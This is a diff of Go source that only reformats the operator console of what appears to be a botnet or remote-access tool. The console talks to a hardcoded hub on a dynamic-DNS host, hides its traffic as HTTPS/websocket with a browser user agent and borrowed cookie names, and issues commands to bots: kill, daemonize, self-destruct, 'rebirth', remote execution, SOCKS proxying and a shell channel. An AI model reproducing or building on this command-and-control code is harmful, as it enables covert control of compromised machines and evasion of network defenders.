@@ -1,26 +1,26 @@
 // go build admin.go share.go
+//
 package main
 
 import (
 	"bufio"
-	"fmt"
 	"flag"
-	"log"
+	"fmt"
 	"io"
+	"log"
 	"net"
 	"os"
-	"strings"
 	"strconv"
+	"strings"
 	"sync"
 
-	"io/ioutil"
 	"encoding/base64"
+	"io/ioutil"
 
+	"./lib/base"
 	"./lib/fakehttp"
 	kit "./lib/toolkit"
-	"./lib/base"
 )
-
 
 var hubPubKey, _ = base64.StdEncoding.DecodeString("MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArogYEOHItjtm0wJOX+hSHjGTIPUsRo/TyLGYxWVk79pNWAhCSvH9nfvpx0skefcL/Nd++Qb/zb3c+o7ZI4zbMKZJLim3yaN8IDlgrjKG7wmjB5r49++LrvRzjIJCAoeFog2PfEn3qlQ+PA26TqLsbPNZi9nsaHlwTOqGljg82g23Zqj1o5JfitJvVlRLmhPqc8kO+4Dvf08MdVS6vBGZjzWFmGx9k3rrDoi7tem22MflFnOQhgLJ4/sbd4Y71ok98ChrQhb6SzZKVWN5v7VCuKqhFLmhZuK0z0f/xkBNcMeCplVLhs/gLIU3HBmvbBSYhmN4dDL19cAv1MkQ6lb1dwIDAQAB")
 var public_ECDSA, _ = base64.StdEncoding.DecodeString("MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAEc8tgqZX82zrd6809YWzJkh4zhvaoCEbkU8yxBW+a9U1L+XgItJGRL33vYecv4lH9ovSNgJiyvnqdmqkJtwq52Q==")
@@ -31,9 +31,9 @@ var huburl = flag.String("t", "cs8425.noip.me:8787", "hub url")
 
 var (
 	fakeHttp = flag.Bool("http", true, "hub act as http server")
-	httpTLS = flag.Bool("tls", true, "via https")
+	httpTLS  = flag.Bool("tls", true, "via https")
 
-	crtFile    = flag.String("crt", "", "PEM encoded certificate file")
+	crtFile = flag.String("crt", "", "PEM encoded certificate file")
 
 	tokenCookieA = flag.String("ca", "cna", "token cookie name A")
 	tokenCookieB = flag.String("cb", "_tb_token_", "token cookie name B")
@@ -41,7 +41,7 @@ var (
 
 	userAgent = flag.String("ua", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36", "User-Agent (default: Chrome)")
 
-	wsObf = flag.Bool("usews", true, "fake as websocket")
+	wsObf     = flag.Bool("usews", true, "fake as websocket")
 	tlsVerify = flag.Bool("k", true, "InsecureSkipVerify")
 )
 
@@ -49,11 +49,11 @@ var admin *base.Auth
 var localserver []*loSrv
 
 type loSrv struct {
-	ID             string
-	Addr           string
-	Args           []string
-	Admin          *base.Auth
-	Lis            net.Listener
+	ID    string
+	Addr  string
+	Args  []string
+	Admin *base.Auth
+	Lis   net.Listener
 }
 
 func main() {
@@ -108,7 +108,7 @@ func main() {
 	}
 
 	// check connection to hub
-	go func(){
+	go func() {
 		for {
 			_, err := mux.AcceptStream()
 			if err != nil {
@@ -133,7 +133,7 @@ func main() {
 		}
 
 		wg.Add(1)
-		go func (line string, wg *sync.WaitGroup) {
+		go func(line string, wg *sync.WaitGroup) {
 			defer wg.Done()
 
 			cmd := strings.Fields(line)
@@ -154,15 +154,13 @@ func main() {
 	wg.Wait()
 }
 
-
-
 // exit?, hasout?, what?
 //var opFunc map[string](func([]string) (bool, bool, string))
 var opFunc = map[string](func([]string) (bool, bool, string)){
-	"bye": opBye,
-	"exit": opBye,
-	"quit": opBye,
-	"bot": opBot,
+	"bye":   opBye,
+	"exit":  opBye,
+	"quit":  opBye,
+	"bot":   opBot,
 	"local": opLocal,
 }
 
@@ -171,7 +169,7 @@ func opBye(args []string) (bool, bool, string) {
 }
 
 func opBot(args []string) (exit bool, hasout bool, out string) {
-	exit , hasout , out  = false, false, "\n"
+	exit, hasout, out = false, false, "\n"
 
 	if len(args) < 1 {
 		hasout, out = true, `
@@ -184,7 +182,6 @@ bot [rm|call] $bot_id $exec
 bot sig $bot_id $pid $signal_code`
 		return
 	}
-
 
 	switch args[0] {
 	case "ls":
@@ -275,13 +272,13 @@ bot sig $bot_id $pid $signal_code`
 			hasout, out = true, "not enough"
 			return
 		}
-		opcode := map[string]string {
+		opcode := map[string]string{
 			"reconn": base.B_reconn,
-			"kill": base.B_kill,
-			"bg":  base.B_dodaemon,
-			"ddd":  base.B_apoptosis,
-			"zero":  base.B_rebirth,
-			"ppkill":  base.B_ppkill,
+			"kill":   base.B_kill,
+			"bg":     base.B_dodaemon,
+			"ddd":    base.B_apoptosis,
+			"zero":   base.B_rebirth,
+			"ppkill": base.B_ppkill,
 			"ppend":  base.B_ppend,
 		}
 		hasout, out = true, "ok...\n"
@@ -374,8 +371,8 @@ bot sig $bot_id $pid $signal_code`
 		}
 		hasout, out = true, "ok...\n"
 
-		opcode := map[string]string {
-			"rm": base.B_del,
+		opcode := map[string]string{
+			"rm":   base.B_del,
 			"call": base.B_call,
 		}
 
@@ -477,10 +474,10 @@ local stop $bind_addr`
 			args = append(args, "socks")
 		}
 
-		srv := &loSrv {
-			ID: args[1],
-			Addr: args[2],
-			Args: args[3:],
+		srv := &loSrv{
+			ID:    args[1],
+			Addr:  args[2],
+			Args:  args[3:],
 			Admin: admin,
 		}
 
@@ -547,7 +544,6 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 		// do socks5
 		base.HandleSocksF(p0, p1)
 
-
 	case "shk":
 		p1, err := admin.GetConn2Client(id, base.B_shk)
 		if err != nil {
@@ -612,4 +608,3 @@ func handleClient(admin *base.Auth, p0 net.Conn, id string, argv []string) {
 	default:
 	}
 }
-
